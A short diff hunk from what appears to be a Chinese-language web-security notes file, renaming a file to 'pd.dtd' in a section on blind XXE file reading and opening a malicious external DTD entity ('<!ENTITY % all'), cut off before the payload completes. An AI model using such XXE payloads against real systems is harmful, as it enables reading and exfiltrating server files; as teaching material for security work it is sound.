@@ -130,7 +130,7 @@ get请求url最好全编码，而不是只有url路径编码。
 
 ^
 ### 3.无回显XXE文件读取：
-服务器文件1.dtd
+服务器文件pd.dtd
 ```
 # pd.dtd
 <!ENTITY % all
